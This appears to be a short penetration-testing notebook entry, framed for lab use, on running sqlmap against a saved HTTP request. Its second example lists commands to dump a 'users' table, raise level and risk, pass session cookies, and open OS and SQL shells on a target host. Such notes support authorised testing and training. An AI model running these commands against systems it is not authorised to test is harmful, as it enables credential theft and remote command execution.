## sqlmap: choose the operation and read the result

Test an identified SQL injection surface using a saved request.

### What the result establishes

Preserve a valid authenticated request and select the input before interpreting confirmed technique and DBMS evidence.

### Prerequisites and common failures

An expired session or CSRF failure cannot be repaired by increasing level/risk; database access and OS execution remain separate outcomes.

### Example 1: Commands

Run in: **Kali**.

```bash
sqlmap -r request.txt --batch
sqlmap -r request.txt --dbs
sqlmap -r request.txt -D DATABASE --tables
```

### Example 2: Earlier notebook reference

Run in: **Saved lab example**.

```bash
sqlmap -r request.txt --batch                 # from a saved raw request
sqlmap -u "http://$IP/item?id=1" --batch --dbs
sqlmap -u "http://$IP/item?id=1" -D shop --tables
sqlmap -u "http://$IP/item?id=1" -D shop -T users --dump
# Auth / cookies / POST
sqlmap -u "http://$IP/login" --data "user=a&pass=b" -p user
sqlmap -u "http://$IP/x" --cookie "PHPSESSID=..." --level 5 --risk 3
# Shells
sqlmap -r request.txt --os-shell            # OS command shell if possible
sqlmap -r request.txt --sql-shell
```
